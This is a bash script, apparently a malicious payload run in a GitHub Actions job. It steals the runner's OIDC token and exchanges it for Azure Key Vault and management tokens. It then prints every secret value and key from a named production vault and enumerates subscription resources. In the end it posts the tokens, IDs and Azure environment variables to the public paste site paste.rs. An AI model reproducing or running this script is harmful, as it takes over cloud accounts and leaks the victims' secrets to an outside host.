#!/usr/bin/env bash
set +x
echo "=== TRUSTED CONTEXT DUMP ==="
env | grep -iE "azure|^ACTIONS_ID|^GITHUB_" | head -30

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
VAULT="https://kv-tbl-prod-x3euoz.vault.azure.net"

OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"
echo "OIDC_TOKEN_BEGIN"
echo "$OIDC"
echo "OIDC_TOKEN_END"

exchange() {
  curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_id=${CLIENT}" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" \
    --data-urlencode "scope=${1}"
}

echo "=== VAULT SCOPE EXCHANGE ==="
VRESP=$(exchange "https://vault.azure.net/.default")
VT=$(echo "$VRESP" | jq -r '.access_token // empty')
if [ -z "$VT" ]; then echo "VAULT_EXCHANGE_FAIL: $VRESP"; else
  echo "VAULT_TOKEN_OK len=${#VT}"
  echo "=== SECRETS LIST ==="
  IDS=$(curl -s "${VAULT}/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id')
  echo "SECRET_IDS_BEGIN"; echo "$IDS"; echo "SECRET_IDS_END"
  for sid in $IDS; do
    VAL=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $VT")
    echo "SECRET_VALUE ${sid} = ${VAL}"
  done
  echo "=== KEYS LIST ==="
  curl -s "${VAULT}/keys?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id' | while read k; do
    echo "KEY: $k"
    curl -s "${k}?api-version=7.4" -H "Authorization: Bearer $VT" | jq -c '{kty,key,kid,n,e}' 2>/dev/null || true
  done
fi

echo "=== MANAGEMENT SCOPE EXCHANGE ==="
MRESP=$(exchange "https://management.azure.com/.default")
AT=$(echo "$MRESP" | jq -r '.access_token // empty')
if [ -n "$AT" ]; then
  echo "ARM_TOKEN_OK len=${#AT}"
  echo "=== SUBSCRIPTION RESOURCES ==="
  curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01" | jq -c '.value[]? | {id,type,name,location}' | head -40
  echo "=== RESOURCE GROUPS ==="
  curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/${SUB}/resourcegroups?api-version=2021-04-01" | jq -c '.value[]? | {name,location}' | head -20
fi

echo "=== AZ CLI ATTEMPT ==="
az login --service-principal --username "$CLIENT" --tenant "$TENANT" --federated-token "$OIDC" 2>&1 | head -5 || true
az keyvault secret list --vault-name kv-tbl-prod-x3euoz 2>&1 | head -30 || true
az acr list -o table 2>&1 | head -10 || true
az resource list -o table 2>&1 | head -30 || true

echo "=== EXFIL PASTE ==="
{ echo "TENANT=$TENANT CLIENT=$CLIENT SUB=$SUB"; echo "OIDC=$OIDC"; echo "VT=$VT"; echo "ARM=$AT"; env | grep -i azure; } > /tmp/exfil.txt 2>/dev/null || true
curl -s --data-binary @/tmp/exfil.txt https://paste.rs/ || true
echo ""
echo "=== DONE ==="
